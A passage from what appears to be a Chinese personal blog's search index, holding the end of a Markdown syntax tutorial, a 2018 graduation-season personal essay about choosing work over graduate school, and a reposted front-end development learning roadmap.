../assets/blogImg/avatar.png 效果： 任务列表注意要空开一行书写。代码： 123- [x] 选项一- [ ] 选项二 - [ ] [选项3] 效果： 选项一 选项二 选项三 表格: 代表对齐方式 , : 与 | 之间不要有空格，否则对齐会有些不兼容。代码： 1234| a | b | c ||:-------:|:------------- | ----------:|| 居中 | 左对齐 | 右对齐 ||=========|===============|============| 效果： a b c 居中 左对齐 右对齐 ========= =============== ============ 简约写法： 1234a | b | c :-:|:- |-: 居中 | 左对齐 | 右对齐 ============|=================|============= 字体 描述 效果 代码 斜体 斜体 *斜体* 斜体 斜体 _斜体_ 加粗 加粗 **加粗** 加粗+斜体 加粗+斜体 ***加粗+斜体*** 加粗+斜体 加粗+斜体 **_加粗+斜体_** 删除线 删除线 ~~删除线~~]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[人生这本书翻开新的一章]]></title>
    <url>%2F%E4%BA%BA%E7%94%9F%E8%BF%99%E6%9C%AC%E4%B9%A6%E7%BF%BB%E5%BC%80%E6%96%B0%E7%9A%84%E4%B8%80%E7%AB%A0.html</url>
    <content type="text"><![CDATA[3月的尾巴，距离大学毕业还剩2个月左右的时间，昨晚和室友卧谈，聊起了在这个时间点，每个站在人生岔路口迷茫的我们。最近考研、考公的都出了结果，漫长的备考过程，本期望着盼来好消息的两个室友却不得不面对与自己第一志愿失之交臂，在调剂亦或是就业中做出选择，当其他得到录取通知的同学开始整日整日放纵欢腾的时候，她们脸上是淡淡的笑，眼里却也有着对未来的迷茫。在和我一起逛过几次招聘会后，昨天其中一个室友说，她决定调剂，去一个离我们很远的地方继续她的学习生涯，说这话时，我能感觉到她隐隐的无奈，但也只能淡淡祝她好运，话题的最后，我仿佛听到自己内心一个声音问道：“这就是你当初不选择考研而是直接工作的原因吗？”不是。去年的这个时候，当我做出这个决定周围经常会有人问“你成绩那么好，大学那么努力，为什么不考虑考研深造呢”，我不考研并不是因为我害怕最后会失败，而是我清楚的知道自己想要什么，即使学生时代那么让人留恋，但明确知道自己想做一名优秀程序媛的我，需要更多的是实践动手能力，在公司中不断参与项目的开发能更快提升我的能力，虽然一个更高的学历可能会为我在就业上扫除很多障碍，就不会像现在的我这样有些无助。不愿离开学生时代，倒不如说是不愿离开象牙塔。但是不管是哪一个选择都已经是过去式，与其缅怀过去不如立足当下。现在的不顺利，是之前的准备不充分，机会是给有准备的人的这句话，不是失败者拿来自我安慰，所幸学习这件事，不管何时开始都不算晚，为了让自己更优秀，让自己成为HR眼中合适的人，让自己离自己的目标越来越接近，就从这篇博文开始，找回那个热血的自己。嘴上立志轻松容易，但学习却是持之以恒，愿自己初心莫负。 ——2018年3月30日于杭州师范大学]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
        <tag>心情</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端学习路线]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF.html</url>
    <content type="text"><![CDATA[第一阶段： HTML+CSS：HTML进阶、CSS进阶、div+css布局、HTML+css整站开发。 JavaScript基础：Js基础教程、js内置对象常用方法、常见DOM树操作大全、ECMAscript、DOM、BOM、定时器和焦点图。 JS基本特效：常见特效、例如：tab、导航、整页滚动、轮播图、JS制作幻灯片、弹出层、手风琴菜单、瀑布流布局、滚动事件、滚差视图。 JS高级特征：正则表达式、排序算法、递归算法、闭包、函数节流、作用域链、基于距离运动框架、面向对象基础。 JQuery：悬着器、DOM操作、特效和动画、方法链、拖拽、变形、JQueryUI组件基本使用。 第二阶段：HTML5和移动Web开发 HTML5：HTML5新语义标签、HTML5表单、音频和视频、离线和本地存储、SVG、Web Socket、Canvas。 CSS3：CSS3新选择器、伪元素、脸色表示法、边框、阴影、background系列属性改变、Transition、动画、景深和深透、3D效果制作、Velocity.js框架、元素进场、出场策略、炫酷CSS3网页制作。 Bootstrap:响应式概念、媒体查询、响应式网站制作、删格系统、删格系统原理、Bootstrap常用模板、LESS和SASS。 移动Web开发：跨终端WEB和主流设备简介、视口、流式布局、弹性盒子、rem、移动终端JavaScript事件、手机中常见JS效果制作、Zepto.js、手机聚划算页面、手机滚屏。 第三阶段：HTTP服务和AJAX编程 WEB服务器基础：服务器基础知识、Apache服务器和其他WEB服务器介绍、Apache服务器搭建、HTTP介绍。 PHP基础：PHP基础语法、使用PHP处理简单的GET或者POST请求。 AJAX上篇：Ajax简介和异步的概念、Ajax框架的封装、XMLHttpRequest对象详细介绍方法、兼容性处理方法、Ajax框架的封装、Ajax中缓存问题、XML介绍和使用。 AJAX下篇：JSON和JSON解析、数据绑定和模板技术、JSONP、跨域技术、图片预读取和lazy-load技术、JQuery框架中的AjaxAPI、使用Ajax实现爆布流案例额。 第四阶段：HTTP服务和AJAX编程 面向对象终极篇：从内存角度到理解JS面向对象、基本类型、复杂类型、原型链、ES6中的面向对象、属性读写权限、设置器、访问器。 面向对象三大特征：继承性、多态性、封装性、接口。 设计模式：面向对象编程思维、单例模式、工厂模式、策略模式、观察者模式、模板方法模式、代理模式、装饰者模式、适配器模式、面向切面编程。 第五阶段：封装一个属于自己的框架 框架封装基础：事件流、冒泡、捕获、事件对象、事件框架、选择框架。 框架封装中级：运动原理、单物体运动框架、多物体运动框架、运动框架面向对象封装。 框架封装高级和补充：JQuery框架雏形、可扩展性、模块化、封装属于传智自己的框架。 第六阶段：模块化组件开发 面向组件编程：面向组件编程的方式、面向组件编程的实现原理、面向组件编程实战、基于组件化思想开发网站应用程序。 面向模块编程：AMD设计规范、CMD设计规范、RequireJS，LoadJS、淘宝的SeaJS。 第七阶段：主流的流行框架 Web开发工作流：GIT/SVN、Yeoman脚手架、NPM/Bower依赖管理工具、Grunt/Gulp/Webpack。 MVC/MVVM/MVW框架：Angular.js、Backbone.js、Knockout/Ember。 常用库：React.js、Vue.js、Zepto.js。 第八阶段：HTML5原生移动应用开发 Cordova：WebApp/NativeApp/HybirdApp简介、Cordova简介、与PhoneGap之间的关系、开发环境搭建、Cordova实战（创建项目，配置，编译，调试，部署发布）。 Ionic：Ionic简介和同类对比、模板项目解析、常见组件及使用、结合Angular构建APP、常见效果（下拉刷新，上拉加载，侧滑导航，选项卡）。 React Native：React Native简介、React Native环境配置、创建项目，配置，编译，调试，部署发布、原生模块和UI组件、原生常用API。 HTML5+：HTML5+中国产业联盟、HTML5 Plus Runtime环境、HBuilder开发工具、MUI框架、H5+开发和部署。 第九阶段：Node.js全栈开发 快速入门：Node.js发展、生态圈、Io.js、Linux/Windows/OS X环境配置、REPL环境和控制台程序、异步编程，非阻塞I/O、模块概念，模块管理工具、开发流程，调试，测试。 核心模块和对象：全局对象global，process，console，util、事件驱动，事件发射器、加密解密，路径操作，序列化和反序列化、文件流操作、HTTP服务端与客户端、Socket.IO。 Web开发基础：HTTP协议，请求响应处理过程、关系型数据库操作和数据访问、非关系型数据库操作和数据访问、原生的Node.js开发Web应用程序、Web开发工作流、Node.js开发Blog案例。 快速开发框架：Express简介+MVC简介、Express常用API、Express路由模块、Jade/Ejs模板引擎、使用Express重构Blog案例、Koa等其他常见MVC框架。 Node.js开发电子商务实战：需求与设计、账户模块注册登录、会员中心模块、前台展示模块、购物车，订单结算、在线客服即时通讯模块。 转自:https://blog.csdn.net/u011047006/article/details/52597178]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
</search>
